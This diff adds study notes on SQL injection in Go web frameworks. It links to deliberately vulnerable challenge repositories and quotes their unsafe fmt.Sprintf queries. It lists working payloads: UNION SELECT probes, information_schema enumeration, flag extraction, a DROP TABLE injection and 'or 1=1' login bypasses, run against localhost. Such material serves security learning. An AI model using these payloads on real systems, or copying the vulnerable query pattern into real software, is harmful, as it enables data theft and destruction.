@@ -42,3 +42,44 @@ definicion de la base de datos
 sql-injection-dummy id serial
 
 
+## SQL Injection in SELECT Sprintf
+
+
+	query := fmt.Sprintf("SELECT * FROM juice WHERE id = '%s'", id)
+
+gingonic ==> https://github.com/KaanSK/golang-sqli-challenge/blob/main/SOLUTION.MD
+r.GET("/juice/:id", service.Get)
+
+    UNION SELECT null;--
+    UNION SELECT null,null;--
+    UNION SELECT null,null,null;--
+    UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='public'
+    UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='super_secret_table'
+    UNION SELECT 1,flag FROM super_secret_table
+
+
+http "localhost:8080/user?id=id=1)) UNION ALL SELECT NULL,version(),current_database(),NULL,NULL,NULL,NULL,NULL--"
+http "localhost:8080/user?id=1)) = ((1)) UNION ALL SELECT NULL,version(),current_database(),NULL,NULL,NULL,NULL,NULL--"
+
+
+gingonic ==> https://github.com/wahyuhadi/gorm-sqlInjection/
+router.GET("/user", GetUser)
+
+        err := dbms.First(&user, id) // Sql Injection in this line /user?id=id=1)) or 1=1--
+
+
+julienschmidt/httprouter
+https://github.com/feedlyy/sql-injection-test/
+err = db.Get(&person, fmt.Sprintf("SELECT * FROM person WHERE id = %s", id))
+        
+        drop table person: SELECT name, email FROM users WHERE ID = '10';DROP TABLE person--*/
+
+
+
+https://github.com/santoshkavhar/SQL-Injection/  (mysql)
+
+	query = fmt.Sprintf("SELECT username, password FROM users1 where username='%s' and password='%s';", username, password)
+
+        SELECT  username, password, FROM users1 where username='' or 1=1 #'' and password='' or 1=1 #'';
+
+
